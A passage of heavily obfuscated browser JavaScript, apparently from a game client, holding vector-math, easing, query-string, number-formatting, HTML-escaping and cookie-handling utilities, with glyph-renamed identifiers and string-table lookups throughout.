				return ⲆⵠⵠΔⵠ.x * ΔⲆⲆⵠᐃ.y - ⲆⵠⵠΔⵠ.y * ΔⲆⲆⵠᐃ.x
			},
			"ⲆΔⲆⵠⵠⲆⵠ": function(ΔⵠΔⵠᐃⵠⵠ, ⲆⲆᐃⵠⲆΔⲆ, ⲆⲆⵠⵠⵠ, ⵠᐃᐃⲆⵠ) {
				var ΔⵠⵠⲆⲆΔΔ = ⵠᐃᐃⲆⵠ - ⲆⲆᐃⵠⲆΔⲆ;
				var ᐃΔᐃΔⲆⵠⵠ = ⲆⲆⵠⵠⵠ - ΔⵠΔⵠᐃⵠⵠ;
				return Math.atan2(ΔⵠⵠⲆⲆΔΔ, ᐃΔᐃΔⲆⵠⵠ)
			},
			"ⲆⲆΔⲆⲆⲆΔ": function(ⲆⵠⵠΔⵠ, ΔⲆⲆⵠᐃ) {
				return Math.asin(this.ⵠⲆΔΔⵠᐃᐃ(ⲆⵠⵠΔⵠ, ΔⲆⲆⵠᐃ) / (this.ⲆⲆⲆⲆᐃⲆⵠ(ⲆⵠⵠΔⵠ) * this.ⲆⲆⲆⲆᐃⲆⵠ(ΔⲆⲆⵠᐃ))) * this.sign(this.ᐃⵠⲆⵠⲆΔΔ(ⲆⵠⵠΔⵠ, ΔⲆⲆⵠᐃ))
			},
			"ⲆⲆᐃᐃⵠΔⲆ": function(ⵠΔⵠⵠΔⲆⲆ) {
				ᐃⲆⲆⲆⵠⵠⲆ = location[ΔᐃⲆⵠⲆⵠΔ[135]];
				ⵠΔⵠⵠΔⲆⲆ = ⵠΔⵠⵠΔⲆⲆ.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
				var ⲆΔⲆⲆΔᐃⵠ = "[\\?&]" + ⵠΔⵠⵠΔⲆⲆ + "=([^&#]*)";
				var ΔᐃⵠⲆⵠⲆⲆ = new RegExp(ⲆΔⲆⲆΔᐃⵠ);
				var ΔΔᐃᐃⲆⲆⵠ = ΔᐃⵠⲆⵠⲆⲆ[ΔᐃⲆⵠⲆⵠΔ[86]](ᐃⲆⲆⲆⵠⵠⲆ);
				return ΔΔᐃᐃⲆⲆⵠ === null ? null : ΔΔᐃᐃⲆⲆⵠ[ᐃᐃⵠ]
			},
			"ᐃᐃᐃⲆⵠⲆᐃ": function(ᐃᐃⵠᐃⵠ, ⲆⵠᐃΔⵠ) {
				var ⵠⲆⵠᐃΔΔⲆ = Math.PI * ᐃⲆⵠᐃ;
				ⲆⵠᐃΔⵠ = (ⲆⵠᐃΔⵠ % ⵠⲆⵠᐃΔΔⲆ + ⵠⲆⵠᐃΔΔⲆ) % ⵠⲆⵠᐃΔΔⲆ;
				if (Math.abs(ᐃᐃⵠᐃⵠ - ⲆⵠᐃΔⵠ) > Math.PI) {
					if (ᐃᐃⵠᐃⵠ > ⲆⵠᐃΔⵠ) return ⲆⵠᐃΔⵠ + ⵠⲆⵠᐃΔΔⲆ;
					else return ⲆⵠᐃΔⵠ - ⵠⲆⵠᐃΔΔⲆ
				}
				return ⲆⵠᐃΔⵠ
			},
			"ΔᐃⵠᐃⵠᐃΔ": function(ⵠᐃΔⵠⵠⲆᐃ, ⵠⲆⲆⲆΔⲆᐃ) {
				return this.ⲆⲆΔⲆⲆⲆΔ({
					x: 1,
					y: 0
				}, this.ᐃᐃⲆᐃⵠⵠᐃ(ⵠᐃΔⵠⵠⲆᐃ, ⵠⲆⲆⲆΔⲆᐃ))
			},
			"ᐃⵠⵠᐃ": function(ⲆⲆᐃⲆ, ⲆᐃΔⲆ) {
				return Math.sqrt((ⲆᐃΔⲆ.x - ⲆⲆᐃⲆ.x) * (ⲆᐃΔⲆ.x - ⲆⲆᐃⲆ.x) + (ⲆᐃΔⲆ.y - ⲆⲆᐃⲆ.y) * (ⲆᐃΔⲆ.y - ⲆⲆᐃⲆ.y))
			},
			"ⵠⲆⵠᐃᐃΔⲆ": function(Δⵠⵠᐃ, ⲆⲆᐃⲆ) {
				return {
					x: Math.sin(ⲆⲆᐃⲆ) * Δⵠⵠᐃ,
					y: Math.cos(ⲆⲆᐃⲆ) * Δⵠⵠᐃ
				}
			},
			"ⲆⵠⲆΔΔᐃᐃ": function(ⲆⲆᐃⲆⵠ, ΔⵠⵠΔΔⵠⲆ) {
				ⲆⲆᐃⲆⵠ.x += ΔⵠⵠΔΔⵠⲆ.x;
				ⲆⲆᐃⲆⵠ.y += ΔⵠⵠΔΔⵠⲆ.y
			},
			"ⲆⲆⵠᐃᐃⵠⵠ": function(ⲆⲆᐃⲆⵠ, ΔⵠⵠΔΔⵠⲆ) {
				ⲆⲆᐃⲆⵠ.x -= ΔⵠⵠΔΔⵠⲆ.x;
				ⲆⲆᐃⲆⵠ.y -= ΔⵠⵠΔΔⵠⲆ.y
			},
			"ᐃⵠᐃΔⵠᐃⵠⵠᐃ": function(ΔᐃΔ, Δⵠ, ⲆⵠⲆ) {
				ΔᐃΔ.x += Δⵠ;
				ΔᐃΔ.y += ⲆⵠⲆ
			},
			"ΔΔᐃΔΔⲆᐃⲆΔ": function(ΔᐃΔ, Δⵠ, ⲆⵠⲆ) {
				return {
					x: ΔᐃΔ.x + Δⵠ,
					y: ΔᐃΔ.y + ⲆⵠⲆ
				}
			},
			"ΔⲆⵠⲆΔ": function(ᐃⲆΔ, Δⵠⵠᐃ, ⲆⲆᐃⲆ) {
				ᐃⲆΔ.x += Math.sin(ⲆⲆᐃⲆ) * Δⵠⵠᐃ;
				ᐃⲆΔ.y += Math.cos(ⲆⲆᐃⲆ) * Δⵠⵠᐃ
			},
			"ⵠΔΔᐃᐃΔⵠ": function(ⲆⲆᐃⲆ, ⲆᐃΔⲆ) {
				return Math.floor((ⲆⲆᐃⲆ - ⲆᐃΔⲆ) / ⲆᐃᐃⲆ)
			},
			"ΔⲆⵠΔⲆⵠΔ": function(ⲆⲆᐃⲆ, ⲆᐃΔⲆ) {
				return {
					x: (ⲆⲆᐃⲆ.x + ⲆᐃΔⲆ.x) / 2,
					y: (ⲆⲆᐃⲆ.y + ⲆᐃΔⲆ.y) / ⲆᐃᐃⲆ
				}
			},
			"ⲆⲆᐃⵠᐃᐃΔ": function() {
				return Math.random() > .5 ? ᐃᐃⵠ : -ᐃᐃⵠ
			},
			"ΔⲆⲆΔᐃⲆⵠᐃᐃ": function(Δⵠ, ⲆⵠⲆ, Δⵠⵠᐃ) {
				var ⵠΔⲆⲆⵠ = this.ⲆⲆᐃⵠᐃᐃΔ();
				var ⲆΔᐃΔΔ = this.ⲆⲆᐃⵠᐃᐃΔ();
				var ⲆⲆᐃⲆ = Math.random() * Math.PI / ⵠⵠⵠΔ;
				return {
					x: Math.floor(Δⵠ + Math.sin(ⲆⲆᐃⲆ) * ⵠΔⲆⲆⵠ * Δⵠⵠᐃ),
					y: Math.floor(ⲆⵠⲆ + Math.cos(ⲆⲆᐃⲆ) * ⲆΔᐃΔΔ * Δⵠⵠᐃ)
				}
			},
			"ⲆΔⵠⲆΔⲆⲆᐃⲆ": function(Δⵠ, ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ) {
				this.x = Δⵠ;
				this.y = ⲆⵠⲆ;
				this.w = ᐃⵠⵠ;
				this.ⵠⵠᐃ = ⵠⵠᐃ
			},
			"ⵠⲆᐃⲆⲆᐃᐃⵠΔ": function(ⲆⲆⵠΔ) {
				ⲆⲆᐃⲆ = [];
				ⲆⲆᐃⲆ.push.apply(ⲆⲆᐃⲆ, ⲆⲆⵠΔ);
				var ⲆⲆΔΔΔΔΔ = [];
				while (ⲆⲆᐃⲆ.length > ᐃΔΔ) {
					var ⲆⲆⵠ = Math.floor(Math.random() * ⲆⲆᐃⲆ.length);
					ⲆⲆΔΔΔΔΔ.push(ⲆⲆᐃⲆ[ⲆⲆⵠ]);
					ⲆⲆᐃⲆ.splice(ⲆⲆⵠ, ᐃᐃⵠ)
				}
				return ⲆⲆΔΔΔΔΔ
			},
			"ᐃⵠΔⲆⵠᐃⵠ": function(ᐃⵠⵠⵠ) {
				if (ᐃⵠⵠⵠ >= 2e4) ᐃⵠⵠⵠ = (ᐃⵠⵠⵠ - 2e4) * 1e3;
				else if (ᐃⵠⵠⵠ >= 1e4) ᐃⵠⵠⵠ = (ᐃⵠⵠⵠ - 1e4) * ⵠᐃⲆΔΔ;
				return ᐃⵠⵠⵠ
			},
			"ⵠΔΔⲆⵠΔΔ": function(ᐃⵠⵠⵠ) {
				if (typeof ᐃⵠⵠⵠ !== "number") return "0";
				else if (ᐃⵠⵠⵠ >= 1e4) {
					var ᐃΔᐃⵠⲆ = Math.floor(Math.log10(ᐃⵠⵠⵠ)) - ⵠⵠΔⲆ;
					var ΔΔΔΔⲆⲆⲆ = Math.max(ᐃΔΔ, 3 - ᐃΔᐃⵠⲆ);
					var ᐃⵠⲆΔ = Math.floor(ᐃⵠⵠⵠ / 1e3)[ΔᐃⲆⵠⲆⵠΔ[31]]();
					if (ΔΔΔΔⲆⲆⲆ) {
						ᐃⵠⲆΔ += "." + (ᐃⵠⵠⵠ % 1e3 / 1e3)[ΔᐃⲆⵠⲆⵠΔ[31]]().substring(ⵠⵠⵠΔ).substring(ᐃΔΔ, ΔΔΔΔⲆⲆⲆ);
						for (var ⵠᐃ = ᐃⵠⲆΔ.length - ⵠΔᐃ, ⵠⵠᐃᐃΔⲆⲆ = 0; ⵠᐃ > ᐃⵠΔ; ⵠᐃ--) {
							if (ᐃⵠⲆΔ[ⵠᐃ] != "0") break;
							else ⵠⵠᐃᐃΔⲆⲆ++
						}
						ᐃⵠⲆΔ = ᐃⵠⲆΔ.substring(ᐃⵠⲆ, ᐃⵠⲆΔ.length - ⵠⵠᐃᐃΔⲆⲆ);
						if (ᐃⵠⲆΔ[ᐃⵠⲆΔ.length - ᐃᐃⵠ] == ".") ᐃⵠⲆΔ = ᐃⵠⲆΔ.substring(0, ᐃⵠⲆΔ.length - 1)
					}
					ᐃⵠⲆΔ += "k";
					return ᐃⵠⲆΔ
				} else return ᐃⵠⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[31]]()
			},
			"ⵠΔⲆᐃᐃⵠⵠ": function(ΔᐃⲆ) {
				return ΔᐃⲆ * (ⵠⵠⵠΔ - ΔᐃⲆ)
			},
			"ᐃⲆΔΔⲆⲆⵠ": function(ΔᐃⲆ) {
				return --ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ + 1
			},
			"ⲆΔⵠⵠᐃ": function(ΔᐃⲆ) {
				return ΔᐃⲆ < .5 ? ⵠⵠⵠΔ * ΔᐃⲆ * ΔᐃⲆ : -ⵠΔᐃ + (4 - ᐃⲆⵠᐃ * ΔᐃⲆ) * ΔᐃⲆ
			},
			"ΔΔⲆΔΔⲆᐃ": function(ΔᐃⲆ) {
				return ΔᐃⲆ < .5 ? ⲆⵠΔⵠ * ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ : (ΔᐃⲆ - ⵠΔᐃ) * (2 * ΔᐃⲆ - ⲆᐃᐃⲆ) * (2 * ΔᐃⲆ - ⵠⵠΔⲆ) + ᐃᐃⵠ
			},
			"ΔΔΔᐃⲆΔᐃΔⲆ": function(ΔᐃⲆ) {
				return ΔᐃⲆ < .5 ? 8 * ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ : 1 - Δᐃⵠⵠⵠ * --ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ
			},
			"ᐃᐃⲆᐃΔⲆᐃ": function(ΔᐃⲆ) {
				return 1 - --ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ
			},
			"Ⲇᐃⵠᐃᐃᐃᐃ": function(ΔᐃⲆ) {
				return ΔⲆⵠ + --ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ * ΔᐃⲆ
			},
			"Δⵠᐃᐃ": function(ᐃⲆΔ, ΔᐃΔ, ᐃᐃᐃᐃ, ⵠᐃΔᐃ, ΔⵠᐃΔⲆΔᐃ, ⲆⲆⲆΔΔΔⲆ) {
				this.ᐃⲆΔ = ᐃⲆΔ;
				this.ΔᐃΔ = ΔᐃΔ;
				this.max = ᐃᐃᐃᐃ;
				this.min = ⵠᐃΔᐃ;
				this.ΔⵠᐃΔⲆΔᐃ = ΔⵠᐃΔⲆΔᐃ;
				this.ⲆⲆⲆΔΔΔⲆ = ⲆⲆⲆΔΔΔⲆ;
				this.ⵠΔⲆΔⵠ = ᐃⵠΔ;
				this.ⵠⲆᐃ = function() {
					if (this.ᐃⲆΔ) {
						var ΔᐃΔ = this.ΔᐃΔ + ᐃⵠᐃᐃ * this.ΔⵠᐃΔⲆΔᐃ;
						if (ΔᐃΔ > this.max) {
							this.ΔᐃΔ = this.max;
							this.ᐃⲆΔ = false;
							return ⵠᐃⲆᐃΔ
						} else this.ΔᐃΔ = ΔᐃΔ
					} else {
						var ΔᐃΔ = this.ΔᐃΔ - ᐃⵠᐃᐃ * this.ⲆⲆⲆΔΔΔⲆ;
						if (ΔᐃΔ < this.min) {
							this.ΔᐃΔ = this.min;
							this.ᐃⲆΔ = ⲆⲆⲆΔⲆ
						} else this.ΔᐃΔ = ΔᐃΔ
					}
				};
				return ᐃᐃⵠΔⵠ
			},
			"ⵠΔⵠⲆⲆ": function(ΔⲆⵠΔΔ, ⲆᐃⲆᐃᐃ, ⵠᐃⵠΔⵠ, ⵠΔⲆⲆⵠ, Δⵠ, ΔᐃΔⲆΔ) {
				this.ΔⲆⵠΔΔ = ΔⲆⵠΔΔ;
				this.ⲆᐃⲆᐃᐃ = ⲆᐃⲆᐃᐃ, this.ⵠᐃⵠΔⵠ = ⵠᐃⵠΔⵠ, this.ⵠΔⲆⲆⵠ = ⵠΔⲆⲆⵠ, this.x = Δⵠ, this.ΔᐃΔⲆΔ = ΔᐃΔⲆΔ, this.ᐃᐃᐃΔΔⲆᐃ = function() {
					this.x = this.ⵠᐃᐃΔᐃⲆⲆⵠⲆ;
					this.ⲆᐃⲆᐃᐃ = ᐃⵠΔ
				}, this.ⲆΔᐃⵠΔ = function(Δⵠ) {
					if (Δⵠ !== this.ΔᐃΔⲆΔ) {
						this.ΔᐃΔⲆΔ = Δⵠ;
						this.ⵠΔⲆⲆⵠ = this.x;
						this.ⲆᐃⲆᐃᐃ = 0
					}
					if (this.ΔᐃΔⲆΔ !== this.x) {
						this.ⲆᐃⲆᐃᐃ += ᐃⵠᐃᐃ;
						if (this.ⲆᐃⲆᐃᐃ > this.ⵠᐃⵠΔⵠ) this.x = this.ΔᐃΔⲆΔ;
						else {
							var ⵠΔⵠⵠ = this.ΔⲆⵠΔΔ(this.ⲆᐃⲆᐃᐃ / this.ⵠᐃⵠΔⵠ);
							this.x = this.ⵠΔⲆⲆⵠ + (this.ΔᐃΔⲆΔ - this.ⵠΔⲆⲆⵠ) * ⵠΔⵠⵠ
						}
					}
				}
			},
			"ⵠΔᐃᐃⲆΔΔ": function(ΔⲆⵠΔΔ, ⲆᐃⲆᐃᐃ, ⵠᐃⵠΔⵠ, ⵠΔⲆⲆⵠ, ⲆΔᐃΔΔ, Δⵠ, ⲆⵠⲆ, ΔᐃΔⲆΔ, ΔⵠⵠⵠᐃΔⵠ) {
				this.ΔⲆⵠΔΔ = ΔⲆⵠΔΔ;
				this.ⲆᐃⲆᐃᐃ = ⲆᐃⲆᐃᐃ, this.ⵠᐃⵠΔⵠ = ⵠᐃⵠΔⵠ, this.ⵠΔⲆⲆⵠ = ⵠΔⲆⲆⵠ, this.ⲆΔᐃΔΔ = ⲆΔᐃΔΔ, this.x = Δⵠ, this.y = ⲆⵠⲆ, this.ΔᐃΔⲆΔ = ΔᐃΔⲆΔ, this.ΔⵠⵠⵠᐃΔⵠ = ΔⵠⵠⵠᐃΔⵠ, this.ⲆΔᐃⵠΔ = function(ᐃᐃᐃΔ) {
					if (ᐃᐃᐃΔ.x != this.ΔᐃΔⲆΔ || ᐃᐃᐃΔ.y != this.ΔⵠⵠⵠᐃΔⵠ) {
						this.ΔᐃΔⲆΔ = ᐃᐃᐃΔ.x;
						this.ΔⵠⵠⵠᐃΔⵠ = ᐃᐃᐃΔ.y;
						this.ⵠΔⲆⲆⵠ = this.x;
						this.ⲆΔᐃΔΔ = this.y;
						this.ⲆᐃⲆᐃᐃ = ΔⲆⲆ
					}
					if (this.ΔᐃΔⲆΔ != this.x || this.ΔⵠⵠⵠᐃΔⵠ != this.y) {
						this.ⲆᐃⲆᐃᐃ += ᐃⵠᐃᐃ;
						if (this.ⲆᐃⲆᐃᐃ > this.ⵠᐃⵠΔⵠ) {
							this.x = this.ΔᐃΔⲆΔ;
							this.y = this.ΔⵠⵠⵠᐃΔⵠ
						} else {
							var ⵠΔⵠⵠ = this.ΔⲆⵠΔΔ(this.ⲆᐃⲆᐃᐃ / this.ⵠᐃⵠΔⵠ);
							this.x = this.ⵠΔⲆⲆⵠ + (this.ΔᐃΔⲆΔ - this.ⵠΔⲆⲆⵠ) * ⵠΔⵠⵠ;
							this.y = this.ⲆΔᐃΔΔ + (this.ΔⵠⵠⵠᐃΔⵠ - this.ⲆΔᐃΔΔ) * ⵠΔⵠⵠ
						}
					}
				}
			},
			"ᐃⵠⲆᐃⲆⵠΔ": function(ΔⲆΔᐃⲆ) {
				var ᐃΔΔⲆⲆ = "";
				for (var ⵠᐃ = ᐃⵠⲆ; ⵠᐃ < ΔⲆΔᐃⲆ; ⵠᐃ++) {
					ᐃΔΔⲆⲆ += String.fromCharCode(48 + Math.floor(Math.random() * 74))
				}
				return ᐃΔΔⲆⲆ
			},
			"ⵠᐃⵠⵠⲆⲆΔ": function(name, ⲆⲆⵠᐃⵠΔᐃ) {
				if (!ⲆⲆⵠᐃⵠΔᐃ) ⲆⲆⵠᐃⵠΔᐃ = location[ΔᐃⲆⵠⲆⵠΔ[135]];
				name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
				var ⲆΔⲆⲆΔᐃⵠ = "[\\?&]" + name + "=([^&#]*)";
				var ΔⲆᐃΔΔⵠⲆ = new RegExp(ⲆΔⲆⲆΔᐃⵠ);
				var ΔΔᐃᐃⲆⲆⵠ = ΔⲆᐃΔΔⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[86]](ⲆⲆⵠᐃⵠΔᐃ);
				return ΔΔᐃᐃⲆⲆⵠ == null ? null : ΔΔᐃᐃⲆⲆⵠ[1]
			},
			"ᐃᐃᐃΔⲆ": function(ⲆⲆΔᐃⵠⲆⵠ) {
				let ᐃΔⲆⵠⲆᐃᐃ = "";
				const ΔⲆΔᐃⲆ = ⲆⲆΔᐃⵠⲆⵠ.length;
				for (let ⵠᐃ = ᐃⵠΔ; ⵠᐃ < ΔⲆΔᐃⲆ; ⵠᐃ++) ᐃΔⲆⵠⲆᐃᐃ += String.fromCharCode(ⲆⲆΔᐃⵠⲆⵠ[ⵠᐃ]);
				return ᐃΔⲆⵠⲆᐃᐃ
			},
			"ᐃΔᐃΔᐃᐃⲆ": function(ᐃⲆⲆ, ⲆᐃΔⵠᐃ) {
				if (ᐃⲆⲆ.x >= ⲆᐃΔⵠᐃ.x && ᐃⲆⲆ.x <= ⲆᐃΔⵠᐃ.x + ⲆᐃΔⵠᐃ.w && ᐃⲆⲆ.y >= ⲆᐃΔⵠᐃ.y && ᐃⲆⲆ.y <= ⲆᐃΔⵠᐃ.y + ⲆᐃΔⵠᐃ.ⵠⵠᐃ) return true;
				return ΔᐃᐃⲆⲆ
			},
			"ᐃᐃΔⵠΔⲆᐃ": function(ⵠᐃⲆΔᐃⲆΔ, ⵠᐃΔⵠⲆⵠⲆ, ⲆᐃΔᐃΔⵠⲆ, ⲆΔᐃⲆΔΔΔ, ⵠⵠᐃⲆⲆΔᐃ, ΔⲆⲆⵠᐃΔⵠ, ⵠⲆⵠΔⵠᐃⲆ, ΔⲆΔΔᐃΔⲆ) {
				if (Math.max(ⵠᐃⲆΔᐃⲆΔ, ⵠⵠᐃⲆⲆΔᐃ) < Math.min(ⵠᐃΔⵠⲆⵠⲆ, ΔⲆⲆⵠᐃΔⵠ) && Math.max(ⲆᐃΔᐃΔⵠⲆ, ⵠⲆⵠΔⵠᐃⲆ) < Math.min(ⲆΔᐃⲆΔΔΔ, ΔⲆΔΔᐃΔⲆ)) return ᐃᐃⵠ;
				return ᐃⵠΔ
			},
			"ⲆⲆᐃⲆΔ": function(p1, p2, ᐃⵠⵠ) {
				return (ⵠΔᐃ - ᐃⵠⵠ) * p1 + ᐃⵠⵠ * p2
			},
			"ΔⵠΔⲆᐃⲆᐃ": function(ⲆᐃΔⲆΔΔⵠ) {
				return ⲆᐃΔⲆΔΔⵠ.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;")
			}
		};
		Math.sign = Math.sign || function(ᐃⵠⵠⵠ) {
			if (ᐃⵠⲆ === ᐃⵠⵠⵠ) return 0;
			else if (ᐃⵠⵠⵠ > ΔⲆⲆ) return ⵠΔᐃ;
			else return -1
		};
		const ⲆᐃΔⵠΔ = ⲆⵠⵠⲆⲆ;
		Math.log10 = Math.log10 || function(Δⵠ) {
			return Math.log(Δⵠ) / Math.ⲆⵠⵠΔᐃⲆⵠⵠⵠ
		};
		const ⲆΔᐃΔⵠ = ⵠᐃΔⵠᐃ;
		const ⵠⲆⲆᐃⵠ = ⲆⵠΔΔᐃ;
		const ⵠΔⵠΔΔ = ΔⵠΔᐃᐃ;
		const ΔⵠᐃⲆ = ⵠⵠⵠΔ;
		const ⵠΔΔ = ⵠΔᐃ;
		const ᐃᐃᐃⵠᐃ = ᐃΔⲆΔᐃ;
		const ⲆΔᐃⵠᐃ = ΔⲆⲆᐃᐃ;
		(function(ᐃⵠᐃⵠΔⵠᐃ) {
			var ᐃᐃⵠᐃⲆᐃΔ = false;
			if ("function" === typeof ᐃΔⵠⵠᐃᐃⵠ && ᐃΔⵠⵠᐃᐃⵠ.ⵠᐃΔΔⲆⲆΔᐃᐃ) {
				ᐃΔⵠⵠᐃᐃⵠ(ᐃⵠᐃⵠΔⵠᐃ);
				ᐃᐃⵠᐃⲆᐃΔ = true
			}
			if (typeof ⵠⲆⲆᐃⲆᐃΔ === ⵠ[186]) {
				ΔᐃΔᐃᐃΔⲆⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[108]] = ᐃⵠᐃⵠΔⵠᐃ();
				ᐃᐃⵠᐃⲆᐃΔ = true
			}
			if (!ᐃᐃⵠᐃⲆᐃΔ) {
				var ⲆⵠⲆᐃΔⲆΔ = ᐃⲆᐃΔᐃⵠᐃ.ΔΔᐃᐃ;
				var ⵠᐃᐃᐃⲆ = ᐃⲆᐃΔᐃⵠᐃ.ΔΔᐃᐃ = ᐃⵠᐃⵠΔⵠᐃ();
				ⵠᐃᐃᐃⲆ.ΔⵠⵠⵠⵠⵠⵠΔΔ = function() {
					ᐃⲆᐃΔᐃⵠᐃ.ΔΔᐃᐃ = ⲆⵠⲆᐃΔⲆΔ;
					return ⵠᐃᐃᐃⲆ
				}
			}
		})((function() {
			function ⲆΔᐃᐃΔⲆΔ() {
				var ⵠᐃ = 0;
				var ⵠⵠᐃᐃⵠ = {};
				for (; ⵠᐃ < arguments.length; ⵠᐃ++) {
					var ΔᐃᐃᐃⲆ = arguments[ⵠᐃ];
					for (var ᐃᐃⲆⲆΔ in ΔᐃᐃᐃⲆ) {
						ⵠⵠᐃᐃⵠ[ᐃᐃⲆⲆΔ] = ΔᐃᐃᐃⲆ[ᐃᐃⲆⲆΔ]
					}
				}
				return ⵠⵠᐃᐃⵠ
			}

			function ⲆⲆⲆΔⵠ(ᐃⵠΔΔⵠⵠⲆ) {
				function ⵠᐃᐃᐃⲆ(ᐃᐃⲆⲆΔ, ΔⵠᐃΔ, ΔᐃᐃᐃⲆ) {
					var ⵠⵠᐃᐃⵠ;
					if ("undefined" === typeof document) {
						return
					}
					if (arguments.length > 1) {
						ΔᐃᐃᐃⲆ = ⲆΔᐃᐃΔⲆΔ({
							path: "/"
						}, ⵠᐃᐃᐃⲆ.ⲆᐃⲆⲆᐃΔⵠ, ΔᐃᐃᐃⲆ);
						if (typeof ΔᐃᐃᐃⲆ.expires === "number") {
							var ᐃⵠᐃⵠΔ = new Date;
							ᐃⵠᐃⵠΔ.setMilliseconds(ᐃⵠᐃⵠΔ.getMilliseconds() + ΔᐃᐃᐃⲆ.expires * 864e5);
							ΔᐃᐃᐃⲆ.expires = ᐃⵠᐃⵠΔ
						}
						try {
							ⵠⵠᐃᐃⵠ = JSON.stringify(ΔⵠᐃΔ);
							if (/^[\{\[]/.test(ⵠⵠᐃᐃⵠ)) {
								ΔⵠᐃΔ = ⵠⵠᐃᐃⵠ
							}
						} catch (ⵠΔⵠⵠ) {}
						if (!ᐃⵠΔΔⵠⵠⲆ.write) {
							ΔⵠᐃΔ = encodeURIComponent(String(ΔⵠᐃΔ)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent)
						} else {
							ΔⵠᐃΔ = ᐃⵠΔΔⵠⵠⲆ.write(ΔⵠᐃΔ, ᐃᐃⲆⲆΔ)
						}
						ᐃᐃⲆⲆΔ = encodeURIComponent(String(ᐃᐃⲆⲆΔ));
						ᐃᐃⲆⲆΔ = ᐃᐃⲆⲆΔ.replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent);
						ᐃᐃⲆⲆΔ = ᐃᐃⲆⲆΔ.replace(/[\(\)]/g, escape);
						return document[ΔᐃⲆⵠⲆⵠΔ[233]] = [ᐃᐃⲆⲆΔ, "=", ΔⵠᐃΔ, ΔᐃᐃᐃⲆ.expires ? "; expires=" + ΔᐃᐃᐃⲆ.expires[ΔᐃⲆⵠⲆⵠΔ[26]]() : "", ΔᐃᐃᐃⲆ.path ? "; path=" + ΔᐃᐃᐃⲆ.path : "", ΔᐃᐃᐃⲆ.domain ? "; domain=" + ΔᐃᐃᐃⲆ.domain : "", ΔᐃᐃᐃⲆ.ΔⵠⲆⲆΔⲆⲆⲆⵠ ? "; secure" : ""].join("")
					}
					if (!ᐃᐃⲆⲆΔ) {
						ⵠⵠᐃᐃⵠ = {}
					}
					var ᐃⲆᐃⵠⵠΔⵠ = document[ΔᐃⲆⵠⲆⵠΔ[233]] ? document[ΔᐃⲆⵠⲆⵠΔ[233]].split("; ") : [];
					var ᐃΔⲆΔⵠᐃⲆ = /(%[0-9A-Z]{2})+/g;
					var ⵠᐃ = ᐃⵠⲆ;
					for (; ⵠᐃ < ᐃⲆᐃⵠⵠΔⵠ.length; ⵠᐃ++) {
						var ᐃⵠⲆⵠⲆⵠΔ = ᐃⲆᐃⵠⵠΔⵠ[ⵠᐃ].split("=");
						var ⲆΔⵠⲆᐃ = ᐃⵠⲆⵠⲆⵠΔ.slice(1).join("=");
						if (ⲆΔⵠⲆᐃ.charAt(0) === '"') {
							ⲆΔⵠⲆᐃ = ⲆΔⵠⲆᐃ.slice(1, -1)
						}
						try {
							var name = ᐃⵠⲆⵠⲆⵠΔ[0].replace(ᐃΔⲆΔⵠᐃⲆ, decodeURIComponent);
							ⲆΔⵠⲆᐃ = ᐃⵠΔΔⵠⵠⲆ.read ? ᐃⵠΔΔⵠⵠⲆ.read(ⲆΔⵠⲆᐃ, name) : ᐃⵠΔΔⵠⵠⲆ(ⲆΔⵠⲆᐃ, name) || ⲆΔⵠⲆᐃ.replace(ᐃΔⲆΔⵠᐃⲆ, decodeURIComponent);
							if (this.json) {
								try {
									ⲆΔⵠⲆᐃ = JSON.parse(ⲆΔⵠⲆᐃ)
								} catch (ⵠΔⵠⵠ) {}
							}
							if (ᐃᐃⲆⲆΔ === name) {
								ⵠⵠᐃᐃⵠ = ⲆΔⵠⲆᐃ;
								break
							}
							if (!ᐃᐃⲆⲆΔ) {
								ⵠⵠᐃᐃⵠ[name] = ⲆΔⵠⲆᐃ
							}
						} catch (ⵠΔⵠⵠ) {}
					}
					return ⵠⵠᐃᐃⵠ
				}
				ⵠᐃᐃᐃⲆ.set = ⵠᐃᐃᐃⲆ;
				ⵠᐃᐃᐃⲆ.get = function(ᐃᐃⲆⲆΔ) {
					return ⵠᐃᐃᐃⲆ.call(ⵠᐃᐃᐃⲆ, ᐃᐃⲆⲆΔ)
				};
				ⵠᐃᐃᐃⲆ.ⵠᐃᐃⵠᐃᐃⵠᐃⵠ = function() {
					return ⵠᐃᐃᐃⲆ.apply({
						json: ᐃᐃⲆᐃᐃ
					}, [].slice.call(arguments))
				};
				ⵠᐃᐃᐃⲆ.ⲆᐃⲆⲆᐃΔⵠ = {};
				ⵠᐃᐃᐃⲆ.remove = function(ᐃᐃⲆⲆΔ, ΔᐃᐃᐃⲆ) {
					ⵠᐃᐃᐃⲆ(ᐃᐃⲆⲆΔ, "", ⲆΔᐃᐃΔⲆΔ(ΔᐃᐃᐃⲆ, {
						expires: -1
					}))
				};
				ⵠᐃᐃᐃⲆ.ⵠΔΔⲆⲆⵠΔⲆΔ = ⲆⲆⲆΔⵠ;
				return ⵠᐃᐃᐃⲆ
			}
			return ⲆⲆⲆΔⵠ((function() {}))
		}));

		function ᐃΔⵠᐃᐃᐃⲆ() {
			this.ⵠᐃⵠΔΔΔᐃ = 0, this.ⲆΔⵠᐃᐃ = ⵠΔΔ, this.IDLE = 2, this.ⲆⵠΔⵠᐃᐃᐃ = 0, this.ᐃᐃⵠᐃⲆⵠᐃΔΔ = 1, this.ⵠΔΔᐃ = {
				x: ᐃⵠΔ,
				y: ᐃΔΔ
			};
			this.ΔᐃⲆᐃᐃᐃⲆ = ᐃⵠⲆ;
			this.ᐃΔΔⵠᐃΔⵠ = ᐃΔΔ;
